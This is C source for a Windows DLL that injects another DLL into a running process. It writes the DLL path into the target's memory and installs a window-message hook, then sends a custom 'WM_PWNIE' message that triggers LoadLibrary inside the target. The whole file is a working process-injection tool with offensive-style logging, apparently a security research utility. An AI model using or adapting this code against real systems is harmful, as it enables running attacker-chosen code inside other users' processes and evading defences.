/**
 * Copyright (C) 2013 Anders Sundman <anders@4zm.org>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * 	This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define  _WIN32_WINNT  0x0501 

#include <windows.h>
#include <stdio.h>

static unsigned int WM_PWNIE;
static HHOOK hookHandle;

typedef struct {
	HWND wnd;
	DWORD proc;
	DWORD thread;
} WinProcThread;

BOOL CALLBACK ProcFinder(HWND hwnd, LPARAM lParam);
HWND GetWindowFromProc(DWORD procid);

__declspec(dllexport) 
LRESULT WINAPI MessageHookProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	WM_PWNIE = RegisterWindowMessage("Pwnies in your message pump!");

	if (nCode == HC_ACTION)
	{

		CWPSTRUCT* msg = (CWPSTRUCT*)lparam;
		if (msg != NULL && msg->message == WM_PWNIE)
		{
			// Need to allocate memory in target proc for string if this is to work
			const char* pill = (const char*)msg->wParam;
			LoadLibrary(pill);
		}
	}
	return CallNextHookEx(hookHandle, nCode, wparam, lparam);
}

__declspec(dllexport) 
int msg_inject(int process_id, const char* pill) {
	WM_PWNIE = RegisterWindowMessage("Pwnies in your message pump!");

	printf("[+] Injecting message into proc: %d\n", process_id);

  // Get handle to this dll
	HINSTANCE targetModule = 0;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&MessageHookProc, &targetModule) == 0)
		goto error;

	printf("[+] Got module handle where MessageHookProc lives: %d\n", targetModule);

  // Get handle to target process
	printf("[+] OpeningProcess %d\n", process_id);

	HANDLE targetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
	if (targetProc == 0)
		goto error;

	printf("[+] OpenProcess got handle %d\n", targetProc);

  // Lookup window handle
	HWND window = GetWindowFromProc(process_id);
	if (window == 0) {
		printf("[-] Couldn't find a window handle for the process\n");
		goto cleanup;
	}
	printf("[+] Window handle: %d\n", window);

  // Find remote UI thread
	DWORD threadID = GetWindowThreadProcessId(window, 0);
  printf("[+] Find UI thread: %d\n", threadID);

	// Allocate a string for the dll in the remote process
	int pillLen = strlen(pill);
	printf("[+] Will now allocate %d bytes in the remote process\n", pillLen);

	void* remoteBuf = VirtualAllocEx(targetProc, NULL, pillLen, MEM_COMMIT, PAGE_READWRITE);
	if (remoteBuf == 0)
		goto error;
	if (WriteProcessMemory(targetProc, remoteBuf, pill, pillLen, NULL) == 0)
		goto error;

  printf("[+] Allocated and wrote: '%s' to %p\n", pill, remoteBuf);

  // Register a local message hook in the target process
	printf("[+] Seting Hook. Type: %d Callback %p DLL: %d thread: %d\n", 
		WH_CALLWNDPROC, &MessageHookProc, targetModule, threadID);
	hookHandle = SetWindowsHookEx(WH_CALLWNDPROC, &MessageHookProc, targetModule, threadID);

	if (hookHandle == 0)
		goto error;

	// Send message to trigger callback to local hook
	printf("[+] Sending message\n");
	SendMessage(window, WM_PWNIE, (WPARAM)remoteBuf, 0);
	printf("[+] Message sent\n");
		
	DWORD err;
	char errBuffer[256];

  // finally clause
	cleanup:
	  if (targetProc != 0 && remoteBuf != 0) VirtualFreeEx(targetProc, remoteBuf, 0, MEM_RELEASE);
		if (hookHandle)	UnhookWindowsHookEx(hookHandle);
	  if (targetProc) CloseHandle(targetProc);
		if (targetModule) FreeLibrary(targetModule);

	return 0;

  // catch clause
	error:
		err = GetLastError();
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT), 
    	errBuffer, sizeof(errBuffer) - 1, NULL);
		printf("[-] Error: %s", errBuffer, err);
		goto cleanup;
}

BOOL CALLBACK ProcFinder(HWND hwnd, LPARAM lParam) {

	WinProcThread* wpt = (WinProcThread*)lParam;
	DWORD windowProc = 0;
	DWORD threadID = GetWindowThreadProcessId(hwnd, &windowProc);
	if (wpt->proc == windowProc && GetParent(hwnd) == NULL) {
		wpt->thread = threadID;
		wpt->wnd = hwnd;
		return FALSE;
	}

	return TRUE;
}

HWND GetWindowFromProc(DWORD procid) {
	WinProcThread wpt;
	wpt.wnd = 0;
	wpt.proc = procid;

	EnumWindows((WNDENUMPROC)&ProcFinder, (LPARAM)&wpt);
	return wpt.wnd;
}
